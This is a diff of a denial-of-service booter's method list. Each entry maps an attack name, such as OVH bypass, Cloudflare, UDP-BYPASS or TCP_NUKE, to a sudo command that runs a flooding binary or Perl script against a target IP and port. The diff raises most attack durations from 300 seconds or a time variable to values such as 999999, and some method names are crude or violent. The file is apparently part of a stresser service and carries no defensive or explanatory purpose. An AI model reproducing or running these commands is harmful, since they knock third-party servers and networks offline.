@@ -4,40 +4,40 @@ SSA : sudo ./ssa (ip)
 
 ETC : sudo ./etc (ip) (port)
 
-OVH : sudo ./ovh %ip% %port% 9999 0 %time
+OVH : sudo ./ovh %ip% %port% 9999 0 9999
 
-OVH-V2 : sudo ./ovhbypass2 %ip% %port% %time udp
+OVH-V2 : sudo ./ovhbypass2 %ip% %port% 999999 udp
 
 STD : sudo ./STD-NOSPOOF %ip% %port%
 
-STCP : sudo ./STCP %ip% %port% 10 -1 %time ack
+STCP : sudo ./STCP %ip% %port% 10 -1 999999 ack
 
-HEX : sudo ./HEX OVH %ip% %port% 300
+HEX : sudo ./HEX OVH %ip% %port% 999999
 
-NUKE-BYPASS : sudo ./HiperOVH %ip% %port
+NUKE-BYPASS : sudo ./HiperOVH %ip% %port%
 
-CLOUDFLARE : sudo ./cloudflare %ip% 10 -1 300
+CLOUDFLARE : sudo ./cloudflare %ip% 10 -1 999999
 
-ETHERA : sudo ./ETHERA %ip% %port
+ETHERA : sudo ./ETHERA %ip% %port%
 
-CPU-SURGE : sudo ./CPU-SURGE TCP %ip% %port% 300
+CPU-SURGE : sudo ./CPU-SURGE TCP %ip% %port% 999999
 
-VALID-SYN : sudo ./WRA %ip% %port% 10 -1 300
+VALID-SYN : sudo ./WRA %ip% %port% 10 -1 999999
 
-R4P3 : sudo ./gre %ip% 10 -1 300
+R4P3 : sudo ./gre %ip% 10 -1 999999
 
-NFO : sudo ./NFO %ip% %port% 10 -1 300
+NFO : sudo ./NFO %ip% %port% 10 -1 999999
 
-UDP-BYPASSV2 : sudo perl UDP-BYPASS-V2.pl %ip% %port% 5500 300
+UDP-BYPASSV2 : sudo perl UDP-BYPASS-V2.pl %ip% %port% 5500 999999
 
-UDP-BYPASS : sudo perl UDP-BYPASS.pl %ip% 300
+UDP-BYPASS : sudo perl UDP-BYPASS.pl %ip% 999999
 
-NULL : sudo perl UDP_NULL.pl %ip% 300
+NULL : sudo perl UDP_NULL.pl %ip% 999999
 
-PATH : sudo perl UDP_BPSS.pl %ip% %port% 5500 300
+PATH : sudo perl UDP_BPSS.pl %ip% %port% 5500 9999
 
-UDP-MIX : sudo perl UDP_MIX.pl %ip% 300
+UDP-MIX : sudo perl UDP_MIX.pl %ip% 9999
 
-TCP_NUKE : sudo perl TCP_VOX.pl %ip% 300
+TCP_NUKE : sudo perl TCP_VOX.pl %ip% 9999
 
-OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 300
+OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 9999
